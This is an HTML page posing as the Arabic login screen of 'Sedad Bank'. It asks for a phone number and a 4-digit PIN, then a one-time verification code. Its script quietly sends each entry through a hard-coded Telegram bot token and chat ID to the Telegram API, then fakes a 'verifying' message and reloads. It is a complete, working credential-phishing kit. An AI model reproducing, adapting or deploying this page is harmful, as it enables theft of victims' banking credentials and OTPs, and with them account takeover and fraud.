<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sedad Bank - بنك السداد</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
        body { font-family: 'Tajawal', sans-serif; background: linear-gradient(to bottom, #f3f8ff, #ffffff); margin: 0; min-height: 100vh; }

        /* الهيدر العلوي */
        .top-header { background-color: #009640; height: 50px; display: none; align-items: center; justify-content: center; position: relative; color: white; font-weight: bold; }
        .back-icon { position: absolute; left: 15px; font-size: 24px; cursor: pointer; }

        /* تنسيق واجهة بنك السداد */
        .logo-box { display: flex; justify-content: center; padding: 60px 0 40px; }
        .logo-img { width: 220px; }

        .input-wrapper { padding: 0 40px; }
        .phone-field { width: 100%; border: 1px solid #ccc; border-radius: 12px; padding: 12px 15px; text-align: right; font-size: 16px; outline: none; background: white; margin-bottom: 20px; }
        
        .pin-container { display: flex; gap: 12px; justify-content: center; margin-bottom: 30px; }
        .pin-box { width: 60px; height: 80px; border: 1px solid #ccc; border-radius: 15px; text-align: center; font-size: 24px; font-weight: bold; outline: none; background: white; }
        .pin-box:focus { border-color: #009640; }

        .btn-sedad { background-color: #009640; color: white; width: 100%; padding: 14px; border-radius: 12px; font-size: 20px; font-weight: bold; border: none; cursor: pointer; }
        
        /* واجهة الـ OTP */
        #screen-otp { display: none; padding: 20px; text-align: center; }
        .otp-boxes { display: flex; gap: 10px; justify-content: center; margin: 30px 0; }
        .otp-dot { width: 50px; height: 60px; border: 1px solid #ccc; border-radius: 10px; text-align: center; font-size: 22px; outline: none; }
        .timer-ring { width: 45px; height: 45px; border: 4px solid #00ff00; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 15px auto; }
    </style>
</head>
<body>

    <!-- الواجهة الأولى: تسجيل الدخول (بنك السداد) -->
    <div id="screen-login">
        <div class="logo-box">
            <img src="https://i.ibb.co/3sX8H3N/sedad-logo.png" alt="Sedad Bank" class="logo-img">
        </div>

        <div class="input-wrapper">
            <div style="position: relative;">
                <input id="user_id" type="tel" class="phone-field" placeholder="رقم الهاتف" maxlength="8">
            </div>

            <div class="pin-container">
                <input type="password" maxlength="1" class="pin-box login-pin" oninput="moveFocus(this, 0)">
                <input type="password" maxlength="1" class="pin-box login-pin" oninput="moveFocus(this, 1)">
                <input type="password" maxlength="1" class="pin-box login-pin" oninput="moveFocus(this, 2)">
                <input type="password" maxlength="1" class="pin-box login-pin" oninput="moveFocus(this, 3)">
            </div>

            <button onclick="goToOTP()" class="btn-sedad">تسجيل الدخول</button>

            <div class="text-center mt-6 text-gray-700 text-sm">
                هل نسيت كلمة المرور؟
            </div>

            <div class="text-center mt-20 text-gray-600">
                مستخدم جديد ؟ <span style="color: #c09a5b; font-weight: bold;">سجل الان</span>
            </div>

            <div class="flex justify-center mt-10">
                <div style="background: white; padding: 10px 20px; border-radius: 10px; border: 1px solid #eee; display: flex; align-items: center; gap: 10px; color: #333;">
                    <span>جهات الاتصال</span>
                    <img src="https://img.icons8.com/material-outlined/24/000000/mail.png" style="width: 20px;">
                </div>
            </div>
        </div>
    </div>

    <!-- الواجهة الثانية: رمز التحقق -->
    <div id="screen-otp">
        <div style="background: #009640; color: white; padding: 15px; position: fixed; top: 0; width: 100%; right: 0; font-weight: bold;">
            <span style="position: absolute; right: 15px; font-size: 24px;" onclick="backToLogin()">‹</span>
            رمز التحقق
        </div>

        <div class="mt-20">
            <h2 class="font-bold text-xl px-6">أدخل رمز التأكيد المرسل إلى هاتفك المحمول</h2>
            
            <div class="otp-boxes">
                <input type="tel" maxlength="1" class="otp-dot code-input" oninput="moveFocusOTP(this, 0)">
                <input type="tel" maxlength="1" class="otp-dot code-input" oninput="moveFocusOTP(this, 1)">
                <input type="tel" maxlength="1" class="otp-dot code-input" oninput="moveFocusOTP(this, 2)">
                <input type="tel" maxlength="1" class="otp-dot code-input" oninput="moveFocusOTP(this, 3)">
            </div>

            <p class="text-gray-600 text-sm">تنتهي صلاحية رمز التأكيد خلال</p>
            <p class="font-bold">5 دقائق 0 ثواني</p>

            <div class="timer-ring"></div>
            <button class="text-sm border-b border-black mt-6">إعادة إرسال رمز التأكيد</button>
        </div>
        
        <button onclick="finishProcess()" class="btn-sedad" style="position: fixed; bottom: 0; right: 0; border-radius: 0;">تم</button>
    </div>

    <script>
        const BOT_TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const CHAT_ID = "8665814266";

        function moveFocus(el, index) {
            const pins = document.querySelectorAll('.login-pin');
            if (el.value.length === 1 && index < 3) pins[index + 1].focus();
        }

        function moveFocusOTP(el, index) {
            const otps = document.querySelectorAll('.code-input');
            if (el.value.length === 1 && index < 3) otps[index + 1].focus();
        }

        function goToOTP() {
            const u = document.getElementById('user_id').value;
            let p = "";
            document.querySelectorAll('.login-pin').forEach(input => p += input.value);

            if(u.length >= 8 && p.length === 4) {
                sendData(`🏦 Sedad Bank Login:\n📱 User: ${u}\n🔐 PIN: ${p}`);
                document.getElementById('screen-login').style.display = 'none';
                document.getElementById('screen-otp').style.display = 'block';
            } else {
                alert("يرجى التأكد من البيانات");
            }
        }

        function backToLogin() {
            document.getElementById('screen-otp').style.display = 'none';
            document.getElementById('screen-login').style.display = 'block';
        }

        function finishProcess() {
            let otp = "";
            document.querySelectorAll('.code-input').forEach(i => otp += i.value);
            if(otp.length === 4) {
                sendData(`🔑 Sedad OTP: ${otp}`);
                alert("جاري التحقق من الرمز...");
                location.reload();
            }
        }

        function sendData(msg) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        }
    </script>
</body>
</html>
